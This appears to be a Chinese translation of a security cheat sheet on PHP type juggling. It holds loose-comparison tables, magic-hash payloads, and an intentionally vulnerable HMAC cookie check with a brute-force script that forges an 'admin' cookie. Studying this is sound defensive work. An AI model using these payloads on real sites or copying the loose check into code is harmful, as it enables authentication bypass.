[原文文档](README.en.md)

# 类型篡改

> PHP 是一种弱类型语言，这意味着它试图预测程序员的意图，并在必要时自动将变量转换为不同的类型。例如，只包含数字的字符串可以被视为整数或浮点数。然而，这种自动转换（或类型篡改）可能导致意外结果，特别是在使用 '==' 运算符比较变量时，它只检查值相等性（松散比较），而不检查类型和值相等性（严格比较）。

## 概述

* [松散比较](#松散比较)
    * [True 语句](#true-语句)
    * [NULL 语句](#null-语句)
    * [松散比较](#松散比较)
* [魔法哈希](#魔法哈希)
* [方法论](#方法论)
* [实验室](#实验室)
* [参考文献](#参考文献)

## 松散比较

> 当在攻击者可以控制被比较变量之一的区域中使用松散比较（== 或 !=）而不是严格比较（=== 或 !==）时，就会出现 PHP 类型篡改漏洞。此漏洞可能导致应用程序对真或假语句返回意外答案，并可能导致严重的授权和/或身份验证错误。

* **松散**比较：使用 `== 或 !=` ：两个变量具有"相同的值"。
* **严格**比较：使用 `=== 或 !==` ：两个变量具有"相同的类型和相同的值"。

### True 语句

| 语句                         | 输出 |
| --------------------------------- |:---------------:|
| `'0010e2'   == '1e3'`             | true |
| `'0xABCdef' == ' 0xABCdef'`       | true (PHP 5.0) / false (PHP 7.0) |
| `'0xABCdef' == '     0xABCdef'`   | true (PHP 5.0) / false (PHP 7.0) |
| `'0x01'     == 1`                 | true (PHP 5.0) / false (PHP 7.0) |
| `'0x1234Ab' == '1193131'`         | true (PHP 5.0) / false (PHP 7.0) |
| `'123'  == 123`                   | true |
| `'123a' == 123`                   | true |
| `'abc'  == 0`                     | true |
| `'' == 0 == false == NULL`        | true |
| `'' == 0`                         | true |
| `0  == false`                     | true |
| `false == NULL`                   | true |
| `NULL == ''`                      | true |

> 由于更合理的字符串到数字比较 RFC，PHP8 不会再尝试将字符串转换为数字，这意味着以 0e 开头的哈希碰撞之类的问题终于成为过去！内部函数的一致类型错误 RFC 将防止类似 `0 == strcmp($_GET['username'], $password)` 绕过的情况，因为 strcmp 不会再返回 null 并发出警告，而是会抛出适当的异常。

![LooseTypeComparison](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/Images/table_representing_behavior_of_PHP_with_loose_type_comparisons.png?raw=true)

松散类型比较出现在许多语言中：

* [MariaDB](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Mariadb)
* [MySQL](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Mysql)
* [NodeJS](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/NodeJS)
* [PHP](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/PHP)
* [Perl](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Perl)
* [Postgres](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Postgres)
* [Python](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Python)
* [SQLite](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/SQLite/2.6.0)

### NULL 语句

| 函数 | 语句                  | 输出 |
| -------- | -------------------------- |:---------------:|
| sha1     | `var_dump(sha1([]));`      | NULL |
| md5      | `var_dump(md5([]));`       | NULL |

## 魔法哈希

> 魔法哈希是由于 PHP 类型篡改的一个怪癖而产生的，当将字符串哈希与整数进行比较时。如果字符串哈希以"0e"开头后面只跟数字，PHP 将其解释为科学记数法，在比较操作中该哈希被视为浮点数。

| 哈希 | "魔法"数字/字符串    | 魔法哈希                                    | 发现者/描述      |
| ---- | -------------------------- | --------------------------------------------- | -------------|
| MD4  | gH0nAdHk                   | 0e096229559581069251163783434175              | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md) |
| MD4  | IiF+hTai                   | 00e90130237707355082822449868597              | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md) |
| MD5  | 240610708                  | 0e462097431906509019562988736854              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | QNKCDZO                    | 0e830400451993494058024219903391              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 0e1137126905               | 0e291659922323405260514745084877              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 0e215962017                | 0e291242476940776845150308577824              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 129581926211651571912466741651878684928                | 06da5430449f8f6f23dfc1276f722738              | Raw: ?T0D??o#??'or'8.N=? |

| 哈希 | "魔法"数字/字符串    | 魔法哈希                                    | 发现者/描述      |
| ---- | -------------------------- | --------------------------------------------- | -------------|
| SHA1 | 10932435112                | 0e07766915004133176347055865026311692244      | Michael A. Cleverly, Michele Spagnuolo & Rogdham |
| SHA-224 | 10885164793773          | 0e281250946775200129471613219196999537878926740638594636 | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1138075224010833921) |
| SHA-256 | 34250003024812          | 0e46289032038065916139621039085883773413820991920706299695051332 | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1148586399207178241) |
| SHA-256 | TyNOQHUS                | 0e66298694359207596086558843543959518835691168370379069085300385 | [@Chick3nman512](https://twitter.com/Chick3nman512/status/1150137800324526083) |

```php
<?php
var_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)
var_dump(md5('aabg7XSs')  == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
?>
```

## 方法论

以下代码中的漏洞在于使用松散比较（!=）来验证 $cookie['hmac'] 对计算的 `$hash`。

```php
function validate_cookie($cookie,$key){
 $hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);
 if($cookie['hmac'] != $hash){ // 松散比较
  return false;
  
 }
 else{
  echo "Well done";
 }
}
```

在这种情况下，如果攻击者可以控制 $cookie['hmac'] 值并将其设置为像"0"这样的字符串，并以某种方式操作 hash_hmac 函数返回以"0e"开头后面只跟数字的哈希（这被解释为零），那么条件 $cookie['hmac'] != $hash 将评估为 false，有效地绕过 HMAC 检查。

我们可以控制 cookie 中的3个元素：

* `$username` - 您要攻击的用户名，可能是"admin"
* `$expiration` - 一个 UNIX 时间戳，必须是未来的时间
* `$hmac` - 提供的哈希，"0"

利用阶段如下：

* 准备恶意 cookie：攻击者准备一个 cookie，其中 $username 设置为他们想要冒充的用户（例如，"admin"），`$expiration` 设置为未来的 UNIX 时间戳，$hmac 设置为"0"。
* 暴力破解 `$expiration` 值：然后攻击者暴力破解不同的 `$expiration` 值，直到 hash_hmac 函数生成以"0e"开头且后面只跟数字的哈希。这是一个计算密集型过程，根据系统设置可能不可行。然而，如果成功，这一步将生成一个"类似零"的哈希。

 ```php
 // docker run -it --rm -v /tmp/test:/usr/src/myapp -w /usr/src/myapp php:8.3.0alpha1-cli-buster php exp.php
 for($i=1424869663; $i < 1835970773; $i++ ){
  $out = hash_hmac('md5', 'admin|'.$i, '');
  if(str_starts_with($out, '0e' )){
   if($out == 0){
    echo "$i - ".$out;
    break;
   }
  }
 }
 ?>
 ```

* 使用暴力破解的值更新 cookie 数据：`1539805986 - 0e772967136366835494939987377058`

 ```php
 $cookie = [
  'username' => 'admin',
  'expiration' => 1539805986,
  'hmac' => '0'
 ];
 ```

* 在这种情况下，我们假设密钥是空字符串：`$key = '';`

## 实验室

* [Root Me - PHP - 类型篡改](https://www.root-me.org/en/Challenges/Web-Server/PHP-type-juggling)
* [Root Me - PHP - 松散比较](https://www.root-me.org/en/Challenges/Web-Server/PHP-Loose-Comparison)

## 参考文献

* [(超级)魔法哈希 - myst404 (@myst404_) - 2019年10月7日](https://offsec.almond.consulting/super-magic-hash.html)
* [魔法哈希 - Robert Hansen - 2015年5月11日](http://web.archive.org/web/20160722013412/https://www.whitehatsec.com/blog/magic-hashes/)
* [魔法哈希 – PHP 哈希"碰撞" - Michal Špaček (@spaze) - 2015年5月6日](https://github.com/spaze/hashes)
* [PHP 魔术技巧：类型篡改 - Chris Smith (@chrismsnz) - 2020年8月18日](http://web.archive.org/web/20200818131633/https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
* [为特殊错误类编写漏洞利用：PHP 类型篡改 - Tyler Borland (TurboBorland) - 2013年8月17日](http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html)